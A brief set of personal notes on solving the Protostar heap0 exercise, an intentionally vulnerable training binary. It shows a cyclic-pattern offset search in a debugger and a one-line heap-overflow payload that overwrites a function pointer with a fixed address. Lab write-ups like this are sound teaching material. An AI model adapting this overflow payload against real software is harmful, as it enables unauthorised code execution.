# Protostar heap-overflow notes

I've noticed that a lot of well documented writeups are present for protostar and decided to instaad post a cliff-notes version for this and upcoming ones.

### HEAP Overflow #0
Generated good ol' string using pattern_create for 140
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A6

gbb shows segfault at 0x41346341 which is 72

attack payload:  
	./heap0 `python -c 'print "A" * 72 + "\x64\x84\x04\x08"'`

use ` not ' . huge difference!!
